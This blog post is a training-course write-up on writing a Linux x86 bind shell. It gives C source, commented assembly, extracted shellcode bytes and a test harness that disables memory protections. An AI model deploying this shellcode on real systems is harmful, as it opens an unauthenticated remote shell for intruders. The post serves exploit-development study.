---
layout: post
title: SLAE Exercise 1 - Bind Shell
subtitle: Linux x86 Bind Shell
tags: [SLAE]
---

**Overview**

The first task of the SLAE exam required a bind shell to be written. The requirements for this were as follows:

- Binds to a port.
- Executes a shell on an incoming connection.
- The port number should be easily configurable within the shell code. 

**Requirements**

As a starting point it was decided to find out what is needed to create a bind shell in a higher level language, and how the identified components would work. 

*So what is a bind shell?*

A bind shell is a shell that binds to a specific port on the target that listens to incoming connections. When a device connects to this port, a shell will be presented. 

*So what is needed from a bind shell?* 

It needs to:

- Be waiting for an incoming connection - bind to a port. 
- Provide the incoming connection with a shell by utilising execve (syscall 11). 

The following C taken from [here](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/) was utilised to determine what was needed to create a bind shell:

~~~
#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 
int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 
struct sockaddr_in hostaddr;            // server aka listen address
int main() 
{ 
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 
    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order
    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 
    // Listen for incoming connections 
    listen(host_sockid, 2); 
    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 
    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 
    return 0; 
}
~~~

Using Strace along with the complied C bind shell, it can be seen exactly what Syscalls are required to write a bind shell. The command to run the program with strace was as follows:
~~~
	Sudo strace ./bind
~~~
The open port was connected to so that the entirety of the program running could be observed with strace. The following was observed:

![Strace](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/C_Bind_Strace.png)

It can be seen that a socket is created, bound to a port and set to listen for an incoming connection. Once a connection is observed it accepts the connection and uses dup2 to pipe the inbound connection into the execve Syscall, which will subsequently run '/bin/sh' to provide the inbound connection with a shell. 

**Sockets**

For this task, the networking sections of the code will be done by utilising sockets. Sockets are a standard way to perform network communication through the OS. Sockets can be used to send and receive data over a network. As TCP will be used, stream sockets will be utilised. Within C, sockets are similar to files as they use file descriptors to identify themselves. For C, the following header is used for sockets:

- Sockets.h

As seen within a socket tutorial found online [here](http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html), there are 5 steps to establishing a socket on the server side. These steps are:

1. Create a socket with the socket() system call. 
2. Bind the socket to an address using the bind() system call. The address here will need to consist of a port number on the host machine, for us this will be the listening port to bind our shell to. 
3. Listen for connections with the listen() system call. 
4. Accept a connection with the accept() system call. This call typically blocks until a client connects with the server. 
5. Send and receive data. 

Descriptions of these functions can be seen below:

*Socket* (int domain, int type, int protocol) - Used to create a new socket, returns a file descriptor for the socket or is -1 on error. 

*Bind* (int fd, struct sockaddr *local_addr, socklen_t addr_length) - Binds a socket to a local address so it can listen for incoming connections. Returns 0 on success and -1 on error. 

*Listen* (int fd, int backlog_queue_size) - Listens for incoming connections and queues connection requests up to backlog_queue_size. Returns 0 on success and -1 on error. 

*Accept* (int fd, sockaddr *remote_host, socklen_t *addr_length) - accepts an incoming connection on a bound socket. The address information from the remote host is written into the remote_host structure and the actual size of the address structure is written into *addr_length. This function returns a new socket file descriptor to identify the connected socket or -1 on error. 


**Dup2 - duplicate file descriptor**

From the dup2 man pages, the dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.

A file descriptor (FD) is an abstract indicator (handle) used to access a file or other input/output resource, such as a pipe or network socket. There are 3 standard streams used for this:

- 0 - STDIN (input)
- 1 - STDOUT (output)
- 2 - STDERR (error)

**Execve**

Execve is a syscall that allows execution of another program from within the shell code. For example, '/bin/bash' could be used to provide a shell. For the bind shell, it will be used to provide a shell to the incoming connection. 


**Syscalls**

It needs to be determined what syscalls are required to write this shellcode. This will vary depending on the platform using, for me the location for this was '/usr/include/i386-linux-gnu/asm/unistd_32.h'Using the following, each syscall could be identified:

~~~
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep *syscall* 
~~~

![syscalls](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/syscalls.png)

From looking at this, the Syscalls required are:

- Socketcall 102
- Dup2 - 63
- Execve - 11

**Socketcall**

Of note here is Socketcall, as it encompasses all of the socket related syscalls that are required for the bind shell. Socketcall is used to carry out all of the socket based functionality using the parameters for the call. Socketcall takes 2 parameters, the first being an integer which specifies what call to execute and the second being a pointer to an array of parameters for the corresponding call. 

For the socket functions we need as determined earlier, the following values should be used:

- Socket - 1
- Bind -   2
- Listen - 4
- Accept - 5

These were identified by viewing the following file:

*/usr/include/linux/net.h*

![Socketcall](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/syscall_socketcall.png)

To clarify:

- For the sockets, we should have eax, the value calling the syscall to be 102 (or 0x66). 

- The second value, ebx, should be the corresponding call that we want to use (listed above). 

- Ecx should contain a pointer to the arguments required. 

**Dup2**

As mentioned dup2 is used to pipe the incoming connection from socketcall into the execve call where a shell will be provided. As can be seen in the man pages (man dup2), the structure for dup2 as follows:

*int dup2(int oldfd, int newfd);*

We have the old File Descriptor saved in edx from the earlier accept socketcall which fulfils the first parameter. The 'newfd' will consist of each of the 3 standard streams that were stated earlier. 

So to start, the dup2 syscall is required to be put into eax, this is 63 or '0x3f'. The value required for ebx, as stated before, is the old File Descriptor which is stored within edx. Finally, the new File Descriptor has to be stated, which for this is 0, 1 and 2 for 'STDIN', 'STDOUT' and 'STDERR'. 

**Execve**

Execve is used to execute a program on the machine, in this instance it will be a shell to provide to the incoming connection. The requirements for execve can be seen within the man pages (man execve):

*Int execve(const char *filename, char *const argv[], char *const envp[]);*

Execve executes the program pointed to by filename, which for this will be a shell. The argv parameter is an array of strings to be used as arguments, for this no arguments are required so this will be terminated by a null pointer. The parameter envp is an array of strings too which are passed as  environment to the new program, this is also not required so will be terminated by a null pointer. 

**ASM Bind Shell**

Below is the finished assembly written using the described Syscalls above. The code is heavily commented which should make it easy to follow along. As can be seen, the port that the socket will be bound to can be changed by altering - '\x01\x4d\'.

**Bind Shell Shellcode**

The written assmebly is compiled using the script 'compile.sh' seen on my SLAE github page. This compiles the code with nasm and links it with ld. Once this is done, the compiled shellcode works as can be seen below:

![Bind_Run](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/Bind_Run.png)

*The running compiled assembly*

![Bind_Connect](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/Bind_connect.png)

*The connection to the bind shell*

To obtain shellcode from the compiled assembly, a combination of linux commands can be used which can be found [here](http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump):

~~~
objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
~~~

This presents the following:

~~~
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x56\x66\x68\x01\x4d\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x89\xf1\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
~~~

As can be seen, there are no null bytes within this shellcode. 


**Testing the Shellcode**

To test the shellcode it is inserted within a small C program:

~~~
#include<stdio.h>	
	#include<string.h>
	unsigned char code[] = \
	"shellcode here";
	main()
	{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
	}
~~~

It is then compiled with the following command to prevent any memory protections when compiling:

*gcc -fno-stack-protector -z execstack shellcode.c -o shellcodeprog*

The program can now be run to determine if the code will work:

![Shellcode_Test](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/shellcode_test.png)

With the connection to the selected port being successful:

![Shellcode_Connect](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/shellcode_test_connect.png)


The assembly code that was written for this exercise is as follows:

~~


; Filename: bind.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Bind shell shellcode for Linux x86 for the SLAE course

global _start			

section .text
_start:

	;Clearing the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi

	;Socket Calls
        ;In reverse order, pushing each value to the stack:

	;Socket - creating the socket
	push eax     ; Pushing 0 for the Protocol parameter required
	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
	
	mov al, 0x66 ; Adding syscall for socketcall() to eax
	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'

		     ; At this point, eax is set to 0x66 for the socketcall
		     ; syscall, ebx is set to 0x1 for the socket parameter
		     ; and ecx will contain the values that were pushed to 
		     ; the stack. 

	mov ecx, esp ; Moving the pointer to the stack into ecx for the final
		     ; parameters

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; Moving the File Descriptor return value to edx


	;Bind - binding the created socket to a port
	;Similar to socket, but with different parameters for the bind socketcall

	mov al, 0x66  ; eax contained the File Descriptor, now socketcall().
	mov bl, 0x2   ; Making ebx 2 for bind socketcall()	
	

	;Add parameters to stack to be used for ecx
	;For ecx - int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	;sockaddr structure
	
	push esi      ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes)
    	push word 0x4d01 ; Pushing the port (333) to the stack (4 bytes)
    	push word 0x2 ; Pushing 2 to the stack for IF_INET (4 bytes)

	;addrlen
	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically

	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes
	push ecx     ; The stack pointer 
	push edx     ; File Descriptor from socket call
	
	mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
		     ; ecx with the current stack pointer to the values previously pushed to the stack. 

	int 0x80     ; Interupt to call the syscall


	;Listen - listen for an incoming connection

	mov al, 0x66 ; Socketcall syscall
	mov bl, 0x4  ; Add 4 to ebx for listen 

	;ecx - int listen(int sockfd, int backlog);

	push esi     ; push 0 to stack for backlog
	push edx     ; File Descriptor still saved in edx

	mov ecx, esp ; Moving the pointer to the stack into ecx

	int 0x80     ; Interupt to call the syscall


	;Accept - accept an incoming connection

	mov al, 0x66 ; Socketcall syscall
    	mov bl, 0x5  ; add 5 to ebx for accept

	;ecx int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

	push esi     ; Push 0 to the stack as addr/addrlen are not required
	push edx     ; Push FD from edx

	mov ecx, esp ; Moving the pointer to the stack into ecx

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; As a new FD is returned, it is moved from eax to edx


	;dup2 - duplicate the file descriptor to redirect the incoming connection 
	;Note - this could be looped if required

	mov al, 0x3f  ; Syscall for dup2
	mov ebx, edx  ; Moving the old FD into ebx
	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
   	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall
	

	;execve - execute '/bin/bash' to provide a shell

    	xor eax, eax  ; Clearing eax
    	push eax      ; Pushing 0 to the stack

    	push 0x68736162
   	push 0x2f6e6962
    	push 0x2f2f2f2f

    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
	
	xor ecx, ecx ; Null pointer for ecx argv
	xor edx, edx ; Null pointer for edx envp

    	mov al, 0xb   ; Moving 11 to eax for execve syscall
    	int 0x80      ; Interupt to call the syscall
~~~




